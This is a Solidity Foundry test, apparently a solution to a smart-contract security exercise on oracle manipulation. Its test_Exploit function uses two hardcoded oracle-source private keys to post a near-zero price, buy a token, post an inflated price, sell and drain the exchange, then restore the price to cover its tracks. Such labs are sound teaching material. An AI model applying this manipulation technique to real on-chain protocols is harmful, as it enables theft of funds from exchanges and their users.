// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../../src/17. Oracle Manipulation-1/GoldExchange.sol";
import "../../src/17. Oracle Manipulation-1/GoldOracle.sol";
import "../../src/17. Oracle Manipulation-1/GoldToken.sol";

contract TestOM1 is Test {
    GoldExchange public exchange;
    GoldOracle public oracle;
    GoldToken public token;

    address[] sources;
    uint256[] prices;

    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    uint256 constant INITIAL_EXCHANGE_BALANCE = 1800 ether;
    uint256 constant INITIAL_GOLD_PRICE = 1.5 ether;

    function setUp() public {
        // Oracle sources
        sources.push(address(0x4aC89064Fa0d03De57f802feC722925b4502572A));
        sources.push(address(0x96574c0392112CbEe134eb77e76A183d54A7c18f));
        sources.push(address(0xA7804BB057EBB7D0c0a3C7F4B8710AE854525fd4));

        // Attacker starts with 1 ETH
        vm.deal(attacker, 1 ether);

        // All sources start with the 10 ETH
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], 10 ether);
            prices.push(INITIAL_GOLD_PRICE);
        }

        // Deploy contracts
        token = new GoldToken();
        oracle = new GoldOracle(sources, prices);
        exchange = new GoldExchange{value: INITIAL_EXCHANGE_BALANCE}(address(token), address(oracle));

        // transfer token ownership to the exchange
        token.transferOwnership(address(exchange));
    }

    function test_Exploit() public {
        uint256 initialAttackerBalance = attacker.balance;
        uint256 buyPrice = 0.00000000001 ether;
        uint256 sellPrice = 1800 ether;

        uint256 key1 = 0x221b93d924f48fcf998c7f20b4be36d12eb1d637a8f49e6e76c154f105e882af;
        uint256 key2 = 0x390e61fd668d2cf6db3305df8dc5366ed53d58610cee715c57dfd9f780579344;

        // Reduce the price, buy 1 gold token
        vm.broadcast(key1);
        oracle.postPrice(buyPrice);
        vm.broadcast(key2);
        oracle.postPrice(buyPrice);

        vm.prank(attacker);
        exchange.buyTokens{value: buyPrice}(1);

        // Increase the price, sell 1 gold token
        vm.broadcast(key1);
        oracle.postPrice(sellPrice);
        vm.broadcast(key2);
        oracle.postPrice(sellPrice);

        vm.prank(attacker);
        exchange.sellTokens(1);

        // Revert to original prices
        vm.broadcast(key1);
        oracle.postPrice(INITIAL_GOLD_PRICE);
        vm.broadcast(key2);
        oracle.postPrice(INITIAL_GOLD_PRICE);

        // Exchange lost almost all ETH
        assertLt(address(exchange).balance, 0.1 ether);

        // Attacker earned a lot of ETH on top of the exchange
        assertGt(attacker.balance, initialAttackerBalance + INITIAL_EXCHANGE_BALANCE - 0.2 ether);

        // Gold price shouldn't changed
        assertEq(oracle.getPrice(), INITIAL_GOLD_PRICE);
    }
}
